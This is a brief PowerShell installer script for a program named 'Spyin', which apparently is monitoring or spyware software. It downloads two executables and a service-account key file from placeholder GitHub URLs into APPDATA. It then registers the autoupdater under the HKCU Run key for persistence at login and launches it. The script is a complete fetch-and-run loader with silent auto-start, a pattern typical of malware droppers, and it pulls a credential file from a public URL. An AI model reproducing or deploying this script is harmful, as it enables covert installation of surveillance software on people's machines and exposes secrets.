$dest = "$env:APPDATA\Spyin"
New-Item -ItemType Directory -Force -Path $dest | Out-Null

Write-Host "Downloading Spyin..."
Invoke-WebRequest -Uri "https://github.com/your_username/your_repo/releases/latest/download/Spyin-client.exe" -OutFile "$dest\Spyin-client.exe"
Invoke-WebRequest -Uri "https://github.com/your_username/your_repo/releases/latest/download/Spyin-autoupdate.exe" -OutFile "$dest\Spyin-autoupdate.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/your_username/your_repo/main/serviceAccountKey.json" -OutFile "$dest\serviceAccountKey.json"

# auto-start on login via registry
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "Spyin" -Value "$dest\Spyin-autoupdate.exe"

Write-Host "Done. Spyin installed to $dest and set to run on startup."
Start-Process "$dest\Spyin-autoupdate.exe"